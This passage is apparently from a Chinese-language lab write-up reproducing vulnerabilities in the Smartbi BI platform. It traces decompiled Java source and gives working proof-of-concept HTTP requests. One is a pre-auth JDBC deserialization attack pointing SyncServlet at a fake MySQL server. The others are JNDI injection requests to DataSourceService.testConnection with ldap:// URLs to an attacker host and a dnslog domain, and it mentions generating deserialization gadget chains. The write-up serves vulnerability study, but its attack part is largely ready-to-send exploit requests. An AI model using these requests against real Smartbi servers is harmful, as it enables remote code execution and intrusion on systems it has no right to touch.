class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//192.168.1.25<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702241.png" alt="20250806162931145"></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol><li>根据依赖版本确定存在漏洞</li><li>根据依赖的敏感函数找入口点</li></ol><h2 id="前台JDBC反序列化"><a href="#前台JDBC反序列化" class="headerlink" title="前台JDBC反序列化"></a>前台JDBC反序列化</h2><h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>        <span class="hljs-type">File</span> <span class="hljs-variable">tmpFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">actionType</span> <span class="hljs-operator">=</span> StringUtil.getLanguageValue(<span class="hljs-string">&quot;Synchronization&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>                request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>                response.setBufferSize(<span class="hljs-number">4096</span>);<br>                <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>                    <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                    <span class="hljs-comment">//从请求中提取数据库连接配置和查询语句</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>                    &#125;<br></code></pre></td></tr></table></figure><p>跟进 synchronize</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncResources</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//调用 DbUtil.getConnection() 获取数据库连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>            <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>            <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>跟进 DbUtil.getConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DbUtil</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//将传入的 dbType 字符串转为大写并在 DBType 中查找；如果输入非法，抛出异常并返回 null</span><br>            driverType = DBType.valueOf(dbType.toUpperCase());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//translateDriverInfo() 方法：根据数据库类型、服务器地址、数据库名,生成数据库连接配置，如：&quot;jdbc:db2://&quot; + serverName + &quot;/&quot; + dbName</span><br>        String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>        <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//创建 DefaultConnectionInfo 实例，用于表示连接信息</span><br>            <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>            info.setId(UUIDGenerator.generate());<br>            info.setName(connName);<br>            info.setDriverType(driverType);<br>            info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>            info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>            info.setUser(dbUser);<br>            info.setPassword(dbPass);<br>            <span class="hljs-comment">//获取数据库连接</span><br>            <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>        String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">switch</span> (dbType) &#123;<br>            <span class="hljs-keyword">case</span> DB2:<br>            <span class="hljs-keyword">case</span> DB2_400:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DB2_V9:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> INFORMIX:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.informix.jdbc.IfxDriver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = serverName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-keyword">case</span> INFOBRIGHT:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (dbEncoding == <span class="hljs-literal">null</span>) &#123;<br>                    dbEncoding = <span class="hljs-string">&quot;GBK&quot;</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;mysqlCluster=true&quot;</span>.equals(dbType.getProp())) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql:loadbalance://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;autoReconnect=true&amp;roundRobinLoadBalance=true&amp;failOverReadOnly=false&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;useOldAliasMetadataBehavior=true&amp;useUnicode=true&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MSSQL:<br>                ......<br></code></pre></td></tr></table></figure><p>漏洞点产生在 <code>translateDriverInfo</code> ，此处可以拼接恶意数据库</p><h3 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>构造POC：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbNameO<span class="hljs-attr">nly</span><span class="hljs-operator">=</span>false<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>MYSQL<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>[本机IP]:<span class="hljs-number">3308</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>d5a442d?detectCustomC<span class="hljs-attr">ollations</span><span class="hljs-operator">=</span>true<span class="hljs-variable">&amp;</span>autoD<span class="hljs-attr">eserialize</span><span class="hljs-operator">=</span>yes<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/SyncServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">138</span><br><br><span class="hljs-attribute">type</span>=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=[本机IP]:<span class="hljs-number">3308</span>&amp;dbName=d5a442d?detectCustomCollations=true%<span class="hljs-number">26</span>autoDeserialize=yes<br></code></pre></td></tr></table></figure><p>同样的，开启3308端口，搭建FakeMysql服务器，生成K1链</p><p>成功利用：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702529.png" alt="20250806181941863"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702526.png" alt="20250806192734078"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//如果数据库连接url是以JDNI开头</span><br><span class="hljs-keyword">if</span> (info.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>    <span class="hljs-comment">//去掉 JNDI 部分，保留后边部分，然后用 cxt.lookup 查找并返回 DataSource</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(info.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>    <span class="hljs-keyword">return</span> dataSource.getConnection();<br></code></pre></td></tr></table></figure><h3 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>POC：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">5</span>E67682266D39E9F1475ADA74B62E102<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">466</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://[ip]:15089/bb4e07&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703762.png" alt="20250806192146688"></p><p>生成K1链：</p><p>ldap:&#x2F;&#x2F;[ip]:15089&#x2F;bb4e07</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703873.png" alt="20250806192251404"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703089.png" alt="20250806191933929"></p><p>这里因为端口的问题没有利用成功。报错LDAP服务器未响应</p><p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。安装JavaChains 时将 <code>  -p 50389:50389 ^</code>改成了  <code>-p 15089:50389 ^</code>，可能监听不到，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703075.png" alt="20250806190250099"></p><p>使用dnslog</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 